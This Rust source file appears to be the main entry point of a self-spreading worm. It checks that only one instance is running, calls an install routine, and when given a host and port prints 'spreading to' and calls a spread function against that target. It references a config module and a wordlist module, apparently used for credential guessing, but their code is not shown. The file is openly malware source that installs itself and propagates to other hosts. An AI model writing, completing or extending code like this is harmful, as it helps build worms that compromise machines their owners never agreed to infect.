use single_instance::SingleInstance;
use std::env;

mod config;
mod error;
mod install;
mod spread;
mod wordlist;

pub use error::Error;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let instance = SingleInstance::new(config::SINGLE_INSTANCE_IDENTIFIER).unwrap();
    if !instance.is_single() {
        return Ok(());
    }

    let install_dir = install::install()?;

    let mut args = env::args();
    if args.len() == 2 {
        let host_port = args.nth(1).unwrap();
        println!("spreading to {}", &host_port);
        spread::spread(install_dir, &host_port)?;
    }

    Ok(())
}
